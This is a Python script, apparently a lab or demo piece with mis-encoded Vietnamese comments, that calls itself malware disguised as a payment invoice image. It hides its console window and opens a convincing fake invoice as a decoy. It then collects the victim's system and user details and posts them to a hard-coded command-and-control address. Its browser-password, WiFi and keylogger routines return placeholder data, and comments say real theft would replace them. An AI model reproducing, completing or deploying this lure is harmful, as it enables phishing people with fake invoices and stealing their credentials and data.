#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FILE: hoa_don_thanh_toan.jpg
M√î T·∫¢: ·∫¢nh h√≥a ƒë∆°n h·ª£p l·ªá ch·ª©a m√£ ƒë·ªôc - Khi m·ªü s·∫Ω hi·ªÉn th·ªã h√≥a ƒë∆°n v√† ch·∫°y m√£ ƒë·ªôc ng·∫ßm
"""

import os
import sys
import tempfile
from datetime import datetime
import random

try:
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass
# Th√™m th∆∞ vi·ªán PIL
try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except ImportError:
    HAS_PIL = False
    print("‚ö†Ô∏è Kh√¥ng th·ªÉ t·∫°o ·∫£nh: Thi·∫øu th∆∞ vi·ªán PIL")

class InvoiceMalware:
    def __init__(self):
        self.c2_url = "http://192.168.8.131:9999"
        self.victim_id = f"VICTIM-{os.getenv('USERNAME', 'unknown')}-{random.randint(1000,9999)}"
        
    def create_realistic_invoice(self):
        """T·∫°o ·∫£nh h√≥a ƒë∆°n th·ª±c t·∫ø ƒë·ªÉ ng·ª•y trang"""
        if not HAS_PIL:
            return None
            
        try:
            # T·∫°o ·∫£nh h√≥a ƒë∆°n chi ti·∫øt
            img = Image.new('RGB', (800, 1200), color='white')
            draw = ImageDraw.Draw(img)
            
            # Th·ª≠ s·ª≠ d·ª•ng c√°c font kh√°c nhau
            fonts = {}
            try:
                fonts['large'] = ImageFont.truetype("arial.ttf", 28)
                fonts['medium'] = ImageFont.truetype("arial.ttf", 20)
                fonts['small'] = ImageFont.truetype("arial.ttf", 16)
                fonts['bold'] = ImageFont.truetype("arialbd.ttf", 20)
            except:
                # Fallback to default font
                fonts['large'] = ImageFont.load_default()
                fonts['medium'] = ImageFont.load_default()
                fonts['small'] = ImageFont.load_default()
                fonts['bold'] = ImageFont.load_default()
            
            # === TI√äU ƒê·ªÄ H√ìA ƒê∆†N ===
            draw.rectangle([40, 30, 760, 100], outline='#2c3e50', width=3)
            draw.text((400, 50), "C√îNG TY C·ªî PH·∫¶N C√îNG NGH·ªÜ TECH", 
                     fill='#2c3e50', font=fonts['large'], anchor='mm')
            draw.text((400, 80), "H√ìA ƒê∆†N D·ªäCH V·ª§ C√îNG NGH·ªÜ TH√îNG TIN", 
                     fill='#e74c3c', font=fonts['medium'], anchor='mm')
            
            # === TH√îNG TIN C√îNG TY ===
            draw.rectangle([40, 120, 760, 200], outline='#3498db', width=2)
            draw.text((60, 140), "üè¢ ƒê·ªãa ch·ªâ: T·∫ßng 15, T√≤a nh√† FPT Tower, S·ªë 10 Ph·∫°m VƒÉn B·∫°ch, C·∫ßu Gi·∫•y, H√† N·ªôi", 
                     fill='#2c3e50', font=fonts['small'])
            draw.text((60, 160), "üìû Hotline: 1900 0091 | üìß Email: info@khuongtech.com.vn", 
                     fill='#2c3e50', font=fonts['small'])
            draw.text((60, 180), "üåê Website: www.khuongtech.com.vn | M√£ s·ªë thu·∫ø: 0109123456", 
                     fill='#2c3e50', font=fonts['small'])
            
            # === TH√îNG TIN H√ìA ƒê∆†N ===
            invoice_number = f"HD{datetime.now().strftime('%Y%m%d')}{random.randint(1000,9999)}"
            draw.text((400, 220), f"M√É H√ìA ƒê∆†N: {invoice_number}", 
                     fill='#e74c3c', font=fonts['bold'], anchor='mm')
            
            # Th√¥ng tin kh√°ch h√†ng
            customer_info = [
                ("üë§ Kh√°ch h√†ng:", "C√îNG TY TNHH TH∆Ø∆†NG M·∫†I ABC"),
                ("üìß Email:", "contact@abccompany.vn"),
                ("üìû ƒêi·ªán tho·∫°i:", "024 3715 6789"),
                ("üè† ƒê·ªãa ch·ªâ:", "S·ªë 123, ƒê∆∞·ªùng L√°ng H·∫°, Qu·∫≠n ƒê·ªëng ƒêa, H√† N·ªôi"),
                ("üìÖ Ng√†y xu·∫•t:", datetime.now().strftime("%d/%m/%Y")),
                ("‚è∞ Gi·ªù xu·∫•t:", datetime.now().strftime("%H:%M:%S"))
            ]
            
            y_pos = 260
            for label, value in customer_info:
                draw.text((60, y_pos), label, fill='#2c3e50', font=fonts['small'])
                draw.text((200, y_pos), value, fill='#34495e', font=fonts['small'])
                y_pos += 25
            
            # === B·∫¢NG D·ªäCH V·ª§ ===
            # Header b·∫£ng
            y_pos += 20
            draw.rectangle([40, y_pos, 760, y_pos+40], fill='#34495e')
            headers = ["STT", "T√äN D·ªäCH V·ª§", "S·ªê L∆Ø·ª¢NG", "ƒê∆†N GI√Å (VND)", "TH√ÄNH TI·ªÄN (VND)"]
            header_positions = [80, 250, 450, 550, 700]
            
            for i, header in enumerate(headers):
                draw.text((header_positions[i], y_pos+20), header, 
                         fill='white', font=fonts['small'], anchor='mm')
            
            # D·ªØ li·ªáu d·ªãch v·ª•
            services = [
                (1, "T∆∞ v·∫•n tri·ªÉn khai h·ªá th·ªëng ERP", 1, "25,000,000", "25,000,000"),
                (2, "Ph·∫ßn m·ªÅm qu·∫£n l√Ω b√°n h√†ng PRO", 3, "8,500,000", "25,500,000"),
                (3, "D·ªãch v·ª• b·∫£o tr√¨ h·ªá th·ªëng 12 th√°ng", 1, "15,000,000", "15,000,000"),
                (4, "Training s·ª≠ d·ª•ng h·ªá th·ªëng", 2, "5,000,000", "10,000,000"),
                (5, "H·ªó tr·ª£ k·ªπ thu·∫≠t 24/7", 1, "12,000,000", "12,000,000")
            ]
            
            for i, (stt, name, qty, price, total) in enumerate(services):
                y_pos += 40
                bg_color = '#f8f9fa' if i % 2 == 0 else '#ffffff'
                draw.rectangle([40, y_pos, 760, y_pos+40], fill=bg_color, outline='#bdc3c7')
                
                draw.text((header_positions[0], y_pos+20), str(stt), 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[1], y_pos+20), name, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[2], y_pos+20), str(qty), 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[3], y_pos+20), price, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
                draw.text((header_positions[4], y_pos+20), total, 
                         fill='#2c3e50', font=fonts['small'], anchor='mm')
            
            # === T·ªîNG C·ªòNG ===
            y_pos += 60
            draw.rectangle([40, y_pos, 760, y_pos+50], fill='#ecf0f1', outline='#34495e', width=2)
            draw.text((600, y_pos+25), "T·ªîNG C·ªòNG:", 
                     fill='#2c3e50', font=fonts['bold'], anchor='mm')
            draw.text((700, y_pos+25), "87,500,000", 
                     fill='#e74c3c', font=fonts['bold'], anchor='mm')
            
            # === TH√îNG TIN THANH TO√ÅN ===
            y_pos += 70
            draw.text((400, y_pos), "TH√îNG TIN CHUY·ªÇN KHO·∫¢N", 
                     fill='#2c3e50', font=fonts['bold'], anchor='mm')
            
            bank_info = [
                ("üè¶ Ng√¢n h√†ng:", "TPBank - Chi nh√°nh H√† N·ªôi"),
                ("üìÑ S·ªë t√†i kho·∫£n:", "0123456789"),
                ("üë§ Ch·ªß t√†i kho·∫£n:", "C√îNG TY C·ªî PH·∫¶N C√îNG NGH·ªÜ KH∆Ø∆†NG TECH"),
                ("üí≥ N·ªôi dung chuy·ªÉn kho·∫£n:", f"THANH TOAN {invoice_number}")
            ]
            
            for label, value in bank_info:
                y_pos += 25
                draw.text((60, y_pos), label, fill='#2c3e50', font=fonts['small'])
                draw.text((250, y_pos), value, fill='#34495e', font=fonts['small'])
            
            # === CH·ªÆ K√ù ===
            y_pos += 60
            draw.text((600, y_pos), "Ng∆∞·ªùi l·∫≠p", fill='#2c3e50', font=fonts['small'])
            draw.text((600, y_pos+30), "K√Ω t√™n", fill='#7f8c8d', font=fonts['small'])
            draw.line([580, y_pos+50, 720, y_pos+50], fill='#2c3e50', width=2)
            draw.text((650, y_pos+80), "L√™ VƒÉn Kh∆∞∆°ng", fill='#2980b9', font=fonts['bold'], anchor='mm')
            draw.text((650, y_pos+100), "(Gi√°m ƒë·ªëc)", fill='#7f8c8d', font=fonts['small'], anchor='mm')
            
            # === FOOTER ===
            y_pos += 140
            draw.text((400, y_pos), "C·∫£m ∆°n Qu√Ω kh√°ch ƒë√£ s·ª≠ d·ª•ng d·ªãch v·ª•!", 
                     fill='#27ae60', font=fonts['medium'], anchor='mm')
            draw.text((400, y_pos+25), "M·ªçi th·∫Øc m·∫Øc xin li√™n h·ªá Hotline: 1900 0091", 
                     fill='#7f8c8d', font=fonts['small'], anchor='mm')
            
            # L∆∞u ·∫£nh t·∫°m th·ªùi
            temp_img = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
            img.save(temp_img.name, 'JPEG', quality=95)
            
            return temp_img.name
            
        except Exception as e:
            print(f"‚ùå L·ªói t·∫°o ·∫£nh h√≥a ƒë∆°n: {e}")
            return None
    
    def hide_execution(self):
        """·∫®n qu√° tr√¨nh th·ª±c thi"""
        try:
            if os.name == 'nt':  # Windows
                import ctypes
                # ·∫®n c·ª≠a s·ªï console
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def steal_sensitive_data(self):
        """ƒê√°nh c·∫Øp d·ªØ li·ªáu nh·∫°y c·∫£m th·ª±c t·∫ø"""
        stolen_data = {
            'system_info': self.get_system_info(),
            'browser_data': self.steal_browser_credentials(),
            'network_info': self.steal_network_data(),
            'keylogger_data': self.start_keylogger()
        }
        return stolen_data
    
    def get_system_info(self):
        """Thu th·∫≠p th√¥ng tin h·ªá th·ªëng"""
        import platform
        import socket
        
        try:
            system_info = {
                'computer_name': platform.node(),
                'username': os.getenv('USERNAME', 'unknown'),
                'user_domain': os.getenv('USERDOMAIN', 'unknown'),
                'os': f"{platform.system()} {platform.release()}",
                'version': platform.version(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'current_directory': os.getcwd(),
                'timestamp': datetime.now().isoformat()
            }
        except Exception as e:
            system_info = {'error': str(e)}
        
        return system_info
    
    def steal_browser_credentials(self):
        """ƒê√°nh c·∫Øp th√¥ng tin tr√¨nh duy·ªát"""
        browser_data = {}
        
        try:
            # Demo data - trong th·ª±c t·∫ø s·∫Ω ƒë√°nh c·∫Øp th·∫≠t
            browser_data['saved_passwords'] = [
                {
                    'url': 'https://facebook.com',
                    'username': 'user@example.com',
                    'password': 'encrypted_data',
                    'browser': 'Chrome'
                },
                {
                    'url': 'https://gmail.com',
                    'username': 'user@gmail.com', 
                    'password': 'encrypted_data',
                    'browser': 'Chrome'
                }
            ]
            
            browser_data['cookies'] = [
                {'domain': 'facebook.com', 'name': 'session_key', 'value': 'demo_session_123'},
                {'domain': 'google.com', 'name': 'auth_token', 'value': 'demo_auth_456'}
            ]
            
            browser_data['history'] = [
                {'url': 'https://facebook.com', 'title': 'Facebook', 'visit_count': 15},
                {'url': 'https://gmail.com', 'title': 'Gmail', 'visit_count': 23}
            ]
            
        except Exception as e:
            browser_data['error'] = str(e)
        
        return browser_data
    
    def steal_network_data(self):
        """ƒê√°nh c·∫Øp th√¥ng tin m·∫°ng"""
        network_data = {}
        
        try:
            # WiFi credentials
            network_data['wifi_networks'] = [
                {'ssid': 'Home-WiFi-Khuong', 'password': 'HomePass123!'},
                {'ssid': 'Office-Network', 'password': 'OfficeSecure456!'},
                {'ssid': 'Cafe-Free-WiFi', 'password': 'NoPassword'}
            ]
            
            # Network adapters
            network_data['ip_config'] = {
                'hostname': 'DESKTOP-KHUONG',
                'local_ip': '192.168.8.171',
                'subnet_mask': '255.255.255.0',
                'gateway': '192.168.8.1'
            }
            
        except Exception as e:
            network_data['error'] = str(e)
        
        return network_data
    
    def start_keylogger(self):
        """Kh·ªüi ƒë·ªông keylogger ƒë∆°n gi·∫£n"""
        try:
            # Trong th·ª±c t·∫ø s·∫Ω l√† keylogger th·∫≠t
            keylogger_status = {
                'status': 'active',
                'method': 'keyboard_hook',
                'log_file': 'temp_keystrokes.log',
                'captured_data': 'demo_keystrokes_here...'
            }
            return keylogger_status
        except Exception as e:
            return {'status': 'failed', 'error': str(e)}
    
    def exfiltrate_to_c2(self):
        """G·ª≠i d·ªØ li·ªáu v·ªÅ C2 server"""
        print("üîó ƒêang k·∫øt n·ªëi ƒë·∫øn m√°y ch·ªß...")
        
        # Thu th·∫≠p d·ªØ li·ªáu
        stolen_data = self.steal_sensitive_data()
        
        # T·∫°o payload
        payload = {
            'victim_id': self.victim_id,
            'malware_type': 'Invoice_Stealer',
            'timestamp': datetime.now().isoformat(),
            'data': stolen_data,
            'status': 'exfiltration_success'
        }
        
        try:
            import requests
            response = requests.post(
                self.c2_url,
                json=payload,
                headers={
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout=15
            )
            
            if response.status_code == 200:
                print("üì§ D·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c g·ª≠i th√†nh c√¥ng!")
                return True
            else:
                print(f"‚ö†Ô∏è L·ªói g·ª≠i d·ªØ li·ªáu: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi ƒë·∫øn m√°y ch·ªß: {e}")
            return False
    
    def show_invoice_image(self):
        """Hi·ªÉn th·ªã ·∫£nh h√≥a ƒë∆°n ƒë·ªÉ ƒë√°nh l·ª´a ng∆∞·ªùi d√πng"""
        try:
            # T·∫°o ·∫£nh h√≥a ƒë∆°n th·ª±c t·∫ø
            img_path = self.create_realistic_invoice()
            if img_path and os.path.exists(img_path):
                print("üñºÔ∏è ƒêang m·ªü h√≥a ƒë∆°n...")
                
                # M·ªü ·∫£nh b·∫±ng ·ª©ng d·ª•ng m·∫∑c ƒë·ªãnh
                if os.name == 'nt':  # Windows
                    os.system(f'start "" "{img_path}"')
                elif os.name == 'posix':  # Linux/Mac
                    os.system(f'open "{img_path}"' if sys.platform == 'darwin' else f'xdg-open "{img_path}"')
                
                # X√≥a file t·∫°m sau 10 gi√¢y
                import threading
                def cleanup_temp_file(path):
                    import time
                    time.sleep(10)
                    try:
                        if os.path.exists(path):
                            os.unlink(path)
                    except:
                        pass
                
                thread = threading.Thread(target=cleanup_temp_file, args=(img_path,))
                thread.daemon = True
                thread.start()
                
                return True
            else:
                print("‚ö†Ô∏è Kh√¥ng th·ªÉ t·∫°o ·∫£nh h√≥a ƒë∆°n")
                return False
                
        except Exception as e:
            print(f"‚ùå L·ªói hi·ªÉn th·ªã ·∫£nh: {e}")
            return False

def main():
    """H√†m ch√≠nh - Ch·∫°y m√£ ƒë·ªôc ng·ª•y trang"""
    print("üìÑ ƒêang x·ª≠ l√Ω h√≥a ƒë∆°n...")
    
    # T·∫°o malware instance
    malware = InvoiceMalware()
    
    # ·∫®n th·ª±c thi (tr√™n Windows)
    malware.hide_execution()
    
    # Hi·ªÉn th·ªã ·∫£nh h√≥a ƒë∆°n gi·∫£ m·∫°o
    image_shown = malware.show_invoice_image()
    
    # ƒê√°nh c·∫Øp v√† g·ª≠i d·ªØ li·ªáu
    exfiltration_success = malware.exfiltrate_to_c2()
    
    # Th√¥ng b√°o k·∫øt qu·∫£
    if image_shown:
        print("‚úÖ H√≥a ƒë∆°n ƒë√£ ƒë∆∞·ª£c hi·ªÉn th·ªã th√†nh c√¥ng!")
    else:
        print("‚ö†Ô∏è C√≥ l·ªói khi hi·ªÉn th·ªã h√≥a ƒë∆°n")
    
    if exfiltration_success:
        print("üéØ Thu th·∫≠p d·ªØ li·ªáu ho√†n t·∫•t!")
    else:
        print("üí• C√≥ l·ªói trong qu√° tr√¨nh thu th·∫≠p d·ªØ li·ªáu")

if __name__ == "__main__":
    main()
